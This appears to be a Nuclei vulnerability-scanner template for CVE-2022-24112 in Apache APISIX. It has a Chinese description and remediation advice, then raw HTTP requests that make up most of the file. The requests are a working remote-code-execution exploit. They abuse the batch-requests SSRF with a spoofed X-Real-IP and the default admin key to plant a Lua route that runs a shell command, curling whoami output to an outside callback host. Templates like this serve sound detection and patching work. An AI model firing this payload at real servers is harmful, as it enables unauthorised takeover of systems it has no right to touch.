id: CVE-2022-24112
info:
  name: Apache APISIX - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Apache APISIX batch-requests SSRF导致远程代码执行漏洞
    Apache APISIX 是一个云原生、高性能、可扩展的微服务API 开源网关,基于OpenResty(Nginx+Lua)和etcd来实现。2022年1月22日，安全研究人员披露利用Apache APISIX batch-requests 可造成SSRF漏洞，同时配合伪造 X-Real-IP ，在 APISIX Admin Token 未修改的情况下可利用 SSRF 创建路由以及Lua脚本，从而执行任意命令，控制服务器。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94

    **临时修复方案**
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    condition: and
    part: body_1
    words:
    - '"reason":"OK"'
    - '"status":200'
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - http
  extractors:
  - type: regex
    regex:
    - GET \/([a-z-]+) HTTP
    group: 1
    part: interactsh_request
  matchers-condition: and
  raw:
  - |
    POST /apisix/batch-requests HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9

    {
      "headers":{
        "X-Real-IP":"127.0.0.1",
        "Content-Type":"application/json"
      },
      "timeout":1500,
      "pipeline":[
        {
          "method":"PUT",
          "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
          "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{randstr}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl https://{{interactsh-url}}/`whoami`'); return true end\"}"
        }
      ]
    }
  - |
    GET /api/{{randstr}} HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  req-condition: true
